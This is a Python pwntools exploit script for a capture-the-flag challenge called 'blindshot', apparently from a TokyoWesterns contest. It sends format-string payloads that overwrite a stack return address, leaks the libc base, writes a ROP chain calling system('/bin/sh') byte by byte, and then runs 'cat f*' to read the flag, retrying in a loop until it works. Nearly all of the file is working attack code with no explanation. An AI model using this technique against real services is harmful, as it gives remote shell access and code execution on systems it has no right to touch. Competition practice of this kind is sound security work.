# -*- coding: future_fstrings -*-
#!/usr/bin/env python2

from pwn import *

IP, PORT = 'pwn01.chal.ctf.westerns.tokyo', 12463
libc = ELF('/home/xion/Desktop/GoN/glibc/2.31/libc-2.31.so')
DEBUG = False

context.arch = 'x86_64'
context.aslr = False
context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def start():
    if DEBUG:
        p = process(['/home/xion/Desktop/GoN/glibc/2.31/ld-2.31.so', './blindshot'], env={'LD_LIBRARY_PATH': '/home/xion/Desktop/GoN/glibc/2.31/'})
        #p = process(['./blindshot'])
        gdb.attach(p, gdbscript="handle SIGALRM ignore\n")
    else:
        p = remote(IP, PORT)
    return p

def hn(prev, targ):
    val = targ - prev
    return (val & 0xffff) if (val & 0xffff) > 0 else 0x10000

def hhn(prev, targ):
    val = targ - prev
    return (val & 0xff) if (val & 0xff) > 0 else 0x100

def do_leak():
    payload = ("%lx|" * 0x3f)[:-1]
    p.sendline(payload)
    return list(map(lambda x: int(x, 16), p.recvline(False).split('|')))

while True:
    try:
        p = start()

        # let's go gacha and :pray:
        #printf_rsp = 0xdf20  # just before entering dprintf()
        printf_rsp = 0x7e50
        RET = printf_rsp + 0x38  # returning back to main
        AGAIN_IP = 0x8E
        A_pi = 18
        B_pi = 46
        A = printf_rsp + (A_pi - 5) * 8  # 18$
        B = printf_rsp + (B_pi - 5) * 8  # 46$
        fd_ofs = 0x4c


        def flip_ret():
            payload  = "%c"*(A_pi - 2) + f"%{hn((A_pi - 2), A)}c"
            payload += "%hn"
            
            payload += "%c"*(B_pi - A_pi - 2) + f"%{hn((B_pi - A_pi - 2) + A, RET)}c"
            payload += "%hn"
            
            payload += f"%{hhn(RET, AGAIN_IP)}c%{A_pi}$hhn"
            
            assert(len(payload) < 200)
            p.sendline(payload)
            
            return p.recvuntil('done.\n', True)
        
        def write_ret(ofs, val):
            C = printf_rsp + ofs
            truect = 0  # manage this value, since we're using %hhn -> %hn
            
            payload  = "%c"*(A_pi - 2) + f"%{hhn((A_pi - 2), AGAIN_IP)}c"
            payload += "%hhn"
            truect += (A_pi - 2) + hhn((A_pi - 2), AGAIN_IP)

            payload += "%c"*(B_pi - A_pi - 2) + f"%{hn((B_pi - A_pi - 2) + truect, C)}c"
            payload += "%hn"
            truect += (B_pi - A_pi - 2) + hn((B_pi - A_pi - 2) + truect, C)
            
            payload += f"%{hhn(truect, val)}c%{A_pi}$hhn"
            truect += hhn(truect, val)
            
            payload += f"%{hn(truect, RET)}c%{B_pi}$hn"
            
            assert(len(payload) < 200)
            p.sendline(payload)
            
            return p.recvuntil('done.\n', True)
        
        def leak_ret():
            payload  = "%16lx|"*0x17
            payload += f"%{hhn(17*0x17, AGAIN_IP)}c%{A_pi}$hhn"
            
            assert(len(payload) < 200)
            p.sendline(payload)
            
            res = list(map(lambda x: int(x, 16), p.recvuntil('done.\n', True).split('|')[:0x17]))
            return res

        p.recvuntil('> ')
        flip_ret()

        p.recvuntil('> ')
        write_ret(fd_ofs, 1)

        p.recvuntil('> ')
        leaks = leak_ret()
        libc.address = 0
        libc.address = leaks[15] - libc.libc_start_main_return
        log.success("libc base: {:016x}".format(libc.address))

        # close it back up, we may not finish in 5s otherwise
        p.recvuntil('> ')
        write_ret(fd_ofs, 3)

        rop = ROP(libc)
        rop.call('system', [next(libc.search('/bin/sh\0'))])
        rop_chain = rop.chain()

        #gdb.attach(p, gdbscript="handle SIGALRM ignore\nb *(0x15555551c000+0x129c)\n")

        # pivoter here
        pivot_gadget = rop.find_gadget(["pop r14", "pop r15", "ret"])
        print(hex(pivot_gadget.address))
        for i, c in enumerate(p64(pivot_gadget.address)):
            write_ret(RET - printf_rsp + 0x20 + i, ord(c))

        for i, c in enumerate(rop_chain):
            write_ret(RET - printf_rsp + 0x38 + i, ord(c))

        p.sendline('aa')
        p.sendline('cat f*')

        print(p.recvall())
        break
    except EOFError:
        log.warning('retry')
        p.close()
        continue
    except KeyboardInterrupt:
        break
